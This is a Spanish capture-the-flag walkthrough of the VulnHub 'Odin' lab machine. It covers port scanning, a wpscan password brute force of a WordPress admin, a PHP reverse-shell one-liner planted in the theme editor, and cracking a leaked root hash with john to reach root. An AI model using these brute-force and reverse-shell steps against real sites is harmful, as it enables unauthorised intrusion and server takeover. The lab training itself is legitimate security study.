---
icon: flag
---

# Odin VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 11:32 CEST
Nmap scan report for 192.168.5.202
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.5.3
|_http-title: vikingarmy &#8211; Just another Joomla site
MAC Address: 00:0C:29:F6:90:B6 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
```

Tendremos que editar el archivo `hosts` para que nos cargue el `wordpress`...

```shell
sudo nano /etc/hosts

#Dentro del nano
<IP>        odin
```

Lo guardamos y ahora si lo recargamos nos ira...

Como hay un `wordpress` si nos vamos a `/wp-admin` veremos un panel de login, si probamos a poner como usuario `admin` y contraseña `admin` veremos que no son las credenciales pero nos confirma que el usuario `admin` existe por lo que haremos lo siguiente...

```shell
wpscan --url http://odin/ --usernames admin --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://odin/ [192.168.5.202]
[+] Started: Tue Jun 25 11:40:20 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://odin/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] Registration is enabled: http://odin/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://odin/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://odin/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://odin/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.5.3</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - http://odin/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.3'

[+] WordPress theme in use: twentytwenty
 | Location: http://odin/wp-content/themes/twentytwenty/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://odin/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://odin/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://odin/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / qwerty                                                                                                                                                              
Trying admin / jessica Time: 00:00:00 <                                                                                                          > (20 / 14344412)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: qwerty

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jun 25 11:40:29 2024
[+] Requests Done: 160
[+] Cached Requests: 40
[+] Data Sent: 43.663 KB
[+] Data Received: 32.726 KB
[+] Memory used: 292.051 MB
[+] Elapsed time: 00:00:08
```

Veremos que nos saco las credenciales del usuario `admin`...

```
User = admin
Password = qwerty
```

Por lo que nos logueamos, y una vez dentro nos iremos a `Appearance` y dentro del mismo a `Theme Editor` de ahi vamos a la opcion llamada `Theme Functions` y dentro del codigo `php` meteremos una `Reverese Shell`...

```php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Estamos a la escucha...

```shell
nc -lvnp <PORT>
```

Y le damos al boton de `Update File` una vez hecho eso ya tendremos una shell con el usuario `www-data`...

Sanitizamos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos la siguiente ubicacion...

```shell
cd /var/www/html
```

Y leemos la configuracion tipica de un `worpress`...

```shell
cat wp-config.php
```

Info:

```php
/** root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::*/
```

Veremos una linea con eso de ahi, por lo que intentaremos crackearlo...

```shell
nano hash

#Dentro del nano
root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jasmine          (root)     
1g 0:00:00:00 DONE (2024-06-25 13:53) 1.960g/s 4015p/s 4015c/s 4015C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Veremos que la contraseña de `root` es `jasmine`, por lo que haremos lo siguiente...

```shell
su root
```

Metemos la contarseña y ya seriamos `root` ahora leeremos la flag...

> bjorn (flag\_final)

```
cσηgяαтυℓαтιση

Have a nice day!


aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WaGtmblBWUXlhWQo=
```
